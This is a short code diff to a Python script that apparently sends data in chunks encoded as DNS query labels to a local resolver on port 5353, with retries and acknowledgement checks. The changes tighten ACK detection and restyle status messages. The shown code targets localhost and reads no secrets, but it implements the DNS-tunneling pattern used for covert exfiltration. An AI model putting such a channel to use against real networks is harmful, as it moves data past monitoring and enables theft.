@@ -30,10 +30,18 @@ def send_dns_query(label: str) -> bool:
     try:
         query = dns.message.make_query(label, dns.rdatatype.A)
         response = dns.query.udp(query, '127.0.0.1', port=5353, timeout=2)
-        return True
+
+        
+        for answer in response.answer:
+            if answer.rdtype == dns.rdatatype.A:
+                return True
+
+        return False  
+
     except Exception as e:
-        print(f"[✗] DNS error for {label}: {e}")
+        print(f"❌ DNS error for {label}: {e}")
         return False
+
 
 
 def send_chunk_with_ack(chunk: bytes, seq: int):
@@ -45,13 +53,13 @@ def send_chunk_with_ack(chunk: bytes, seq: int):
     for attempt in range(1, MAX_RETRIES + 1):
         print(f"🔹 Sending chunk {seq}, try {attempt}...")
         if send_dns_query(label):
-            print(f"[✓] ACK received for chunk {seq}")
+            print(f"✅ ACK received for chunk {seq}")
             return True
         else:
-            print(f"[!] No ACK for chunk {seq}, retrying...")
+            print(f"⚠️  No ACK for chunk {seq}, retrying...")
         time.sleep(1)
 
-    print(f"[🚨] Failed to send chunk {seq} after {MAX_RETRIES} attempts.")
+    print(f"🚨 Failed to send chunk {seq} after {MAX_RETRIES} attempts.")
     return False
 
 def main():
